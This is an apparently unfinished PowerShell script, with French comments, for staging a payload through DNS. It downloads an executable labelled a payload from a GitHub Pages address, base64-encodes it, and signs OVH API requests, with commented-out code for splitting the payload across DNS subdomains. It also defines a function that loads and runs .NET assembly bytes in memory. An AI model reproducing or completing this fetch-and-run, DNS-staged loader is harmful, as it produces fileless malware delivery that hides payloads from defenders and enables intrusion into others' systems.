function RunAssembly{
    param (
        [Byte[]]$bytes
    )

    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entryPoint = $assembly.EntryPoint
    $entryPoint.Invoke($null, $null)
}

function GetOVHSignatureFromQuery{
    param (
        [String[]]$ApplicationSecret,
        [String[]]$ConsumerKey,
        [String[]]$Method,
        [String[]]$Query,
        [String[]]$Body,
        $Time
    )
    # Write-Output("AS : " + $ApplicationSecret)
    # Write-Output("CK : " + $ConsumerKey)
    # Write-Output("Method : " + $Method)
    # Write-Output("Query : " + $Query)
    # Write-Output("Body : " + $Body)
    # Write-Output("Time : " + $Time)
    $Sha = "$ApplicationSecret+$ConsumerKey+$Method+$Query+$Body+$Time"
    # Get Hash from String
    $Hash = [System.Web.Security.FormsAuthentication]::HashPasswordForStoringInConfigFile($Sha, "SHA1")
    $Signature = '$1$'+$Hash
    $Signature = $Signature.ToLower()
    # Write-Output("Signature : " + $Signature)
    return($Signature)
}



# Récupération du payload
$url = "https://hakkyahud.github.io/HelloWorldCS.exe"
$bytes = (New-Object Net.WebClient).DownloadData($url)

# Convert to base64
$base64 = [System.Convert]::ToBase64String($bytes)

# $bytes2 = [System.Convert]::FromBase64String($base64)
# RunAssembly($bytes2)

# Send base64 payload to DNS server

# OVH cred API
$endpoint=""
$AK = ""
$AS = ""
$CK = ""
$BODY = ""
$TIME = [DateTimeOffset]::Now.ToUnixTimeSeconds()

# Application GET : /me -> https://eu.api.ovh.com/1.0/me
$QUERY = "https://api.ovh.com/1.0/me"
$METHOD = "GET"

$SIGN = GetOVHSignatureFromQuery -ApplicationSecret $AS -ConsumerKey $CK -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
Write-Output("Signature : " + $SIGN)

Invoke-WebRequest -Method GET -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGN; "X-Ovh-Timestamp"=$TIME} $QUERY


# Subdomain calculation
# $subDomainNumber = [math]::Ceiling($base64.Length/254)
# Invoke-WebRequest -Method GET -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGN; "X-Ovh-Timestamp"=$TIME} https://api.ovh.com/1.0/domain/zone


# For ($i = 0; $i -lt $subDomainNumber; $i++){

# }